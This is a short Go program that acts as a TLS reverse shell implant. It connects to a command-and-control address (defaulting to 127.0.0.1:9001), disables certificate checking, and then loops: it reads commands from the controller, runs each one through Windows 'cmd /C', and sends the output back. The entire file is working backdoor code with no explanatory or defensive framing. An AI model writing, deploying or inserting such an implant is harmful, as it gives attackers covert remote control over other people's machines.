package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

var defaultHost = "127.0.0.1"
var defaultPort = "9001"

var c2Host string
var c2Port string

func init() {
	c2Host = defaultHost
	c2Port = defaultPort
}

func main() {
	address := net.JoinHostPort(c2Host, c2Port)
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := tls.Dial("tcp", address, conf)
	if err != nil {
		fmt.Println("[-] Failed to connect to C2:", err)
		return
	}
	defer conn.Close()
	fmt.Println("[*] Connected to C2")

	for {
		cmdReader := bufio.NewReader(conn)
		cmd, err := cmdReader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Failed to read from C2:", err)
			return
		}
		cmd = strings.TrimSpace(cmd)
		out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		if err != nil {
			out = append(out, []byte("\n[!] Command error: "+err.Error())...)
		}
		conn.Write(out)
	}
}
